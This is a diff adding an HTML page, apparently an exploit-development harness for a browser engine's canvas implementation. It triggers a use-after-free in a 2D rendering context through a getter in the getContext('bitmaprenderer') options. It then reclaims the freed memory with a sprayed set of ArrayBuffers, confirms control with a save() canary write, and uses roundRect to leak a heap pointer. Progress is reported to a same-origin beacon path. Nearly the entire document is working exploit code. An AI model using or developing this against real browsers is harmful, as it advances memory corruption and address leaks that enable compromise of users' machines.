@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V923C - isolate reclaim/call crash (AB spray + save/beginPath/roundRect)</title>
+<style>
+  body { background:#0b0e14; color:#d7e0ea; font-family:ui-monospace,Menlo,monospace; padding:14px; }
+  h1 { color:#58a6ff; font-size:15px; margin:0 0 6px; }
+  p  { color:#8b949e; font-size:12px; margin:4px 0 10px; line-height:1.55; }
+  pre { font-size:12px; white-space:pre-wrap; }
+  code { color:#c9d1d9; background:#21262d; padding:1px 5px; border-radius:4px; }
+  .key { border-left:3px solid #d29922; padding-left:8px; }
+</style>
+</head>
+<body>
+<h1>V923C - isolate why V923 dies before CANARY</h1>
+
+<p class="key">
+<b>V923/V923B evidence:</b> 52+24 loads reached <code>ARM</code> (UAF + 400 AB(768) sprayed, <code>roundRect=true</code>)
+but never emitted <code>CANARY</code> &mdash; the WebProcess died between <code>ARM</code> and the next beacon.
+V923C isolates <i>which</i> call and <i>which</i> reclaim condition crashes: it stages tests with
+per-step <code>pending</code> crash detection (a missing post-beacon on reload = that step crashed).
+Stages: <code>bp-nospray</code> (beginPath, no spray, gate-free/no-write),
+<code>bp-abN</code> (beginPath after AB spray), <code>save-abN</code> (safe canary <code>++m_unrealizedSaveCount</code>
+at +592, then scan ABs for word 148 to prove AB owns the slot),
+<code>rr-abN</code> (after a confirmed canary, <code>roundRect</code> writes a cairo heap ptr at +48/word 12).
+AB counts N = 50,100,200,400,800. All beacons carry <code>stage,try,abs</code>.
+</p>
+
+<pre id="out">starting...</pre>
+
+<script>
+'use strict';
+
+var SEEK = location.pathname;
+var RUN = 'r' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 7);
+
+function lsGet(k) { try { return window.localStorage.getItem('v923c_' + k); } catch (e) { return null; } }
+function lsSet(k, v) { try { window.localStorage.setItem('v923c_' + k, String(v)); } catch (e) {} }
+function lsDel(k) { try { window.localStorage.removeItem('v923c_' + k); } catch (e) {} }
+
+function bks(tag, body) {
+  var u = '/beacon/V923C-' + tag + '?d=' +
+          encodeURIComponent(String(body == null ? '' : body).slice(0, 460)) +
+          '&run=' + encodeURIComponent(RUN) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); }
+  catch (e) { try { var i = new Image(); i.src = u; } catch (e2) {} }
+}
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+
+var F64 = new Float64Array(1), U32 = new Uint32Array(F64.buffer);
+function hexOf(x) { F64[0] = x; return '0x' + ('00000000' + U32[1].toString(16)).slice(-8) + ('00000000' + U32[0].toString(16)).slice(-8); }
+function bits(x) { F64[0] = x; return { hi: U32[1] >>> 0, lo: U32[0] >>> 0 }; }
+function hexAddr(a) { return (isFinite(a) && a >= 0) ? '0x' + Math.floor(a).toString(16) : 'nan'; }
+function errOf(e) { return e ? String(e.name || 'Error') + ':' + String(e.message || '').slice(0, 70) : 'none'; }
+
+var VIEWS = null, KEEP = null, CTX = null, HASRR = false;
+var WORDS = 192;                 /* 768 / 4 */
+var CANARY_WORD = 148;           /* context+592 m_unrealizedSaveCount */
+var AB_SIZES = [50, 100, 200, 400, 800];
+var STAGES = [];
+(function buildStages() {
+  STAGES.push({ name: 'bp-nospray', kind: 'bp', abs: 0 });
+  var i, n;
+  for (i = 0; i < AB_SIZES.length; i++) { n = AB_SIZES[i]; STAGES.push({ name: 'bp-ab' + n, kind: 'bp', abs: n }); }
+  for (i = 0; i < AB_SIZES.length; i++) { n = AB_SIZES[i]; STAGES.push({ name: 'save-ab' + n, kind: 'save', abs: n }); }
+  for (i = 0; i < AB_SIZES.length; i++) { n = AB_SIZES[i]; STAGES.push({ name: 'rr-ab' + n, kind: 'rr', abs: n }); }
+})();
+
+function stageIdx(name) {
+  for (var i = 0; i < STAGES.length; i++) if (STAGES[i].name === name) return i;
+  return 0;
+}
+function curStage() {
+  var nm = lsGet('stage') || STAGES[0].name;
+  var i = stageIdx(nm);
+  return STAGES[i] || STAGES[0];
+}
+function advance(msg) {
+  var i = stageIdx(lsGet('stage') || STAGES[0].name);
+  if (i + 1 < STAGES.length) {
+    lsSet('stage', STAGES[i + 1].name);
+    lsDel('tries');
+    bks('ADV', STAGES[i].name + '->' + STAGES[i + 1].name + (msg ? ',' + msg : ''));
+    say('advance -> ' + STAGES[i + 1].name);
+  } else {
+    lsSet('phase', 'done');
+    bks('DONE', 'all stages complete');
+    say('all stages complete');
+  }
+}
+function triesOf() { var t = parseInt(lsGet('tries') || '0', 10); return isNaN(t) ? 0 : t; }
+function bumpTry() { var t = triesOf() + 1; lsSet('tries', t); return t; }
+
+/* ---------- UAF trigger (32 saves, same as V906/V922/V923) ---------- */
+function trigger(canvas, nsaves) {
+  var saved = null, hasRR = false;
+  var dict = {};
+  Object.defineProperty(dict, 'alpha', {
+    get: function () {
+      var ctx = canvas.getContext('2d');
+      if (!ctx) return true;
+      saved = ctx;
+      try { hasRR = (typeof ctx.roundRect === 'function'); } catch (e0) {}
+      try {
+        ctx.lineWidth = 3.14159;
+        ctx.miterLimit = 7.77;
+        ctx.globalAlpha = 0.42;
+        ctx.lineDashOffset = 2.222;
+        ctx.shadowBlur = 5.55;
+        for (var s = 0; s < nsaves; s++) ctx.save();
+        ctx.lineWidth = 1.0;
+      } catch (e) {}
+      return true;
+    }
+  });
+  var bmp = null;
+  try { bmp = canvas.getContext('bitmaprenderer', dict); } catch (e2) {}
+  return { saved: saved, bmp: bmp, hasRR: hasRR };
+}
+
+/* ---------- zeroed ArrayBuffer spray ---------- */
+function spray(count) {
+  if (count <= 0) { VIEWS = []; KEEP = []; return; }
+  var abs = new Array(count), views = new Array(count);
+  for (var i = 0; i < count; i++) {
+    var ab = new ArrayBuffer(768);
+    views[i] = new Uint32Array(ab);
+    abs[i] = ab;
+  }
+  KEEP = abs;
+  VIEWS = views;
+}
+
+function scanAll(maxHits) {
+  var hits = [];
+  for (var i = 0; i < VIEWS.length; i++) {
+    var v = VIEWS[i];
+    for (var w = 0; w < WORDS; w++) {
+      if (v[w] !== 0) {
+        hits.push([i, w, v[w]]);
+        if (hits.length >= maxHits) return hits;
+      }
+    }
+  }
+  return hits;
+}
+function scanView(i, maxHits) {
+  var hits = [], v = VIEWS[i];
+  if (!v) return hits;
+  for (var w = 0; w < WORDS; w++) {
+    if (v[w] !== 0) { hits.push([w, v[w]]); if (hits.length >= maxHits) return hits; }
+  }
+  return hits;
+}
+function hitStr(hits) {
+  var a = [];
+  for (var i = 0; i < hits.length; i++) {
+    if (hits[i].length === 3) a.push('v' + hits[i][0] + '/w' + hits[i][1] + '=0x' + hits[i][2].toString(16));
+    else a.push('w' + hits[i][0] + '=0x' + hits[i][1].toString(16));
+  }
+  return a.join(',');
+}
+
+function reloadSoon(ms) { setTimeout(function () { location.href = SEEK + '?op=auto&r=' + Date.now(); }, ms); }
+
+/* run a step with crash detection: set pending, do it, clear pending, beacon ok */
+function step(tag, label, fn) {
+  var st = curStage();
+  var t = bumpTry();
+  var meta = 'stage=' + st.name + ',abs=' + st.abs + ',try=' + t;
+  bks(tag + '-PRE', meta + ',' + label);
+  say(tag + ' try ' + t + ' ' + label);
+  lsSet('pending', st.name + ':' + tag + ':' + label);
+  var res, err = null;
+  try { res = fn(); }
+  catch (e) { err = e; }
+  lsDel('pending');
+  if (err) {
+    bks(tag + '-ERR', meta + ',' + errOf(err));
+    say(tag + ' threw ' + errOf(err));
+    return { ok: false, threw: true, err: err };
+  }
+  bks(tag + '-OK', meta);
+  say(tag + ' OK');
+  return { ok: true, threw: false, res: res };
+}
+
+/* ---------- main ---------- */
+function main() {
+  var q = location.search;
+
+  if (q.indexOf('reset=1') >= 0) {
+    lsDel('pending'); lsDel('loads'); lsDel('phase'); lsDel('stage'); lsDel('tries');
+    bks('RESET', 'cleared');
+    say('cleared. reopen ?op=auto');
+    return;
+  }
+
+  var loads = parseInt(lsGet('loads') || '0', 10) + 1;
+  lsSet('loads', loads);
+  if (loads > 600) {
+    bks('GIVEUP', 'loads=' + loads);
+    say('too many loads - reopen with ?reset=1');
+    return;
+  }
+
+  var pend = lsGet('pending');
+  if (pend) {
+    lsDel('pending');
+    var t = triesOf();
+    bks('CRASH', 'pending=' + pend + ',try=' + t + ',load=' + loads);
+    say('CRASH (WebProcess died) pending=' + pend + ' try=' + t);
+    if (t >= 2) {
+      bks('BLACKLIST', 'pending=' + pend);
+      say('stage blacklisted after ' + t + ' crashes');
+      advance('crashx' + t);
+      reloadSoon(1200);
+      return;
+    }
+    say('retrying same stage');
+  }
+
+  if (lsGet('phase') === 'done') { say('done. reset with ?reset=1'); return; }
+
+  var st = curStage();
+  bks('BOOT', 'load=' + loads + ',stage=' + st.name + ',abs=' + st.abs +
+      ',ua=' + navigator.userAgent.slice(0, 48));
+  say('stage ' + st.name + ' abs=' + st.abs);
+
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  document.body.appendChild(canvas);
+  window._v923ccanvas = canvas;
+
+  var tr = trigger(canvas, 32);
+  if (!tr.saved) { bks('ERR', 'trigger-failed,stage=' + st.name); say('trigger failed - reloading'); reloadSoon(1500); return; }
+  CTX = tr.saved;
+  HASRR = tr.hasRR;
+  bks('PREFLIGHT', 'stage=' + st.name + ',roundRect=' + HASRR);
+  if (st.kind === 'rr' && !HASRR) { bks('NORR', st.name); advance('norr'); reloadSoon(800); return; }
+
+  spray(st.abs);
+  bks('ARM', 'stage=' + st.name + ',abs=' + st.abs);
+  say('armed, sprayed ' + st.abs);
+
+  /* ---- stage execution ---- */
+  if (st.kind === 'bp') {
+    var bp = step('BP', 'beginPath', function () { CTX.beginPath(); });
+    if (bp.ok) { bks('BPSURV', st.name); advance('bp-ok'); }
+    else { advance('bp-err'); }
+    reloadSoon(800);
+    return;
+  }
+
+  if (st.kind === 'save') {
+    var sv = step('SAVE', 'save-canary', function () { CTX.save(); });
+    if (!sv.ok) { advance('save-err'); reloadSoon(800); return; }
+    var ch = scanAll(12);
+    bks('CANARY', 'stage=' + st.name + ',n=' + ch.length + ',' + hitStr(ch));
+    say('canary hits=' + ch.length + ' ' + hitStr(ch));
+    if (ch.length > 0) {
+      /* identify the canary word */
+      var slot = -1, cw = -1, cv = 0;
+      for (var i = 0; i < ch.length; i++) {
+        if (ch[i][1] === CANARY_WORD) { slot = ch[i][0]; cw = CANARY_WORD; cv = ch[i][2]; break; }
+      }
+      if (slot < 0) { slot = ch[0][0]; cw = ch[0][1]; cv = ch[0][2]; }
+      bks('SLOT', 'stage=' + st.name + ',v=' + slot + ',word=' + cw + ',val=0x' + cv.toString(16));
+      say('SLOT AB view ' + slot + ' word ' + cw);
+      advance('slot-v' + slot);
+    } else {
+      bks('NOSLOT', 'stage=' + st.name + ',abs=' + st.abs);
+      say('NOSLOT: save survived but no AB saw the write');
+      advance('noslot');
+    }
+    reloadSoon(800);
+    return;
+  }
+
+  if (st.kind === 'rr') {
+    var sv2 = step('SAVE', 'save-canary', function () { CTX.save(); });
+    if (!sv2.ok) { advance('save-err'); reloadSoon(800); return; }
+    var ch2 = scanAll(12);
+    bks('CANARY', 'stage=' + st.name + ',n=' + ch2.length + ',' + hitStr(ch2));
+    say('canary hits=' + ch2.length + ' ' + hitStr(ch2));
+    if (ch2.length === 0) {
+      bks('NOSLOT', 'stage=' + st.name);
+      advance('noslot');
+      reloadSoon(800);
+      return;
+    }
+    var slot2 = -1, cw2 = -1;
+    for (var j = 0; j < ch2.length; j++) {
+      if (ch2[j][1] === CANARY_WORD) { slot2 = ch2[j][0]; cw2 = CANARY_WORD; break; }
+    }
+    if (slot2 < 0) { slot2 = ch2[0][0]; cw2 = ch2[0][1]; }
+    bks('SLOT', 'stage=' + st.name + ',v=' + slot2 + ',word=' + cw2);
+
+    var rr = step('RR', 'roundRect(10,10,100,100,5)', function () { CTX.roundRect(10, 10, 100, 100, 5); });
+    if (!rr.ok) { advance('rr-err'); reloadSoon(800); return; }
+
+    var af = scanView(slot2, 60);
+    bks('AFTER', 'stage=' + st.name + ',v=' + slot2 + ',n=' + af.length + ',' + hitStr(af));
+    say('after rr: ' + hitStr(af));
+
+    var v = VIEWS[slot2], canaryQ = Math.floor(cw2 / 2), P = -1, pw = -1, cands = '';
+    for (var w = 0; w + 1 < WORDS; w += 2) {
+      if (w / 2 === canaryQ) continue;
+      var lo = v[w], hi = v[w + 1];
+      if (lo === 0 && hi === 0) continue;
+      var val = hi * 0x100000000 + lo;
+      cands += 'q' + (w / 2) + '=' + hexAddr(val) + ' ';
+      if (P < 0 && val > 0x10000 && val < 0x1000000000000) { P = val; pw = w; }
+    }
+    if (P < 0) {
+      bks('NOWRITE', 'stage=' + st.name + ',af=' + hitStr(af) + ',q=' + cands.slice(0, 220));
+      say('NOWRITE');
+    } else {
+      var cls = (P >= 0x800000000 && P < 0x900000000) ? 'wk-window' :
+                (P >= 0x7ff000000000 && P < 0x800000000000) ? 'stack' :
+                (P >= 0x100000000) ? 'heap>4G' : 'heap<4G';
+      bks('LEAK', 'stage=' + st.name + ',v=' + slot2 + ',w=' + pw + ',P=' + hexAddr(P) + ',cls=' + cls + ',q=' + cands.slice(0, 140));
+      say('LEAK P=' + hexAddr(P) + ' ' + cls);
+    }
+    advance('rr-done');
+    reloadSoon(800);
+    return;
+  }
+
+  bks('UNKNOWN', st.name);
+  advance('unknown');
+  reloadSoon(800);
+}
+
+try { main(); }
+catch (e) { bks('FATAL', String(e && (e.message || e)).slice(0, 200)); say('FATAL ' + e); }
+</script>
+</body>
+</html>
